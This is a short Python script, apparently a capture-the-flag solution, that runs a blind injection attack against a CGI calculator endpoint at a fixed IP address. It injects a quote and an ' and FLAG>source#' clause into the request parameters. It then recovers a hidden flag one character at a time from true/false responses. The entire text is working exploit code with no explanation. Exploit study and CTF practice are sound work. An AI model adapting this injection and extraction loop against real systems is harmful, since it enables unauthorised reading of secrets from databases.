import requests
import urllib
import string
url="http://54.223.83.192:8888/cgi-bin/calculate.py?t=7e98a8768e606bf9c1ae7dc542edc319&source={0}&value1={1}&op={2}&value2={3}"
flag=""
source=""
value1=urllib.parse.quote("WQERGFD")
op=urllib.parse.quote("+'")
value2=urllib.parse.quote(" and FLAG>source#")
while True:
    prev = 0
    for i in range(255):

        if chr(i) in string.printable:
            source=flag+chr(prev)
            source=urllib.parse.quote(source)
            result=requests.get(url.format(source,value1,op,value2)).text
            print(result)
            if "False" in result and "security" not in result:
                flag+=chr(prev-1)
                print(flag)
                break
            else:
                prev = i